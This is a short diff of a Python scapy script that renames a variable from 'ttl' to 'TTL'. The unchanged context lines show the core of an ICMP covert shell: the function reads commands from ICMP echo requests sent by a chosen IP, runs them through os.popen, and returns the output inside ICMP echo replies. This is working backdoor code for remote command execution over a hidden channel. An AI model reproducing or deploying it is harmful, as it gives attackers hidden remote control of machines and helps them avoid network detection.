@@ -8,7 +8,7 @@ import argparse
 
 #Variables
 icmp_id = int(13170)
-ttl = int(64)
+TTL = int(64)
 
 def check_scapy():
     try:
@@ -25,7 +25,7 @@ def icmpshell(pkt):
     if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 8 and pkt[ICMP].id == icmp_id and pkt[Raw].load:
         icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
         payload = os.popen(icmppaket).readlines()
-        icmppacket = (IP(dst=args.destination_ip, ttl=ttl)/ICMP(type=0, id=icmp_id)/Raw(load=payload))
+        icmppacket = (IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=0, id=icmp_id)/Raw(load=payload))
         sr(icmppacket, timeout=0, verbose=0)
     else:
         pass
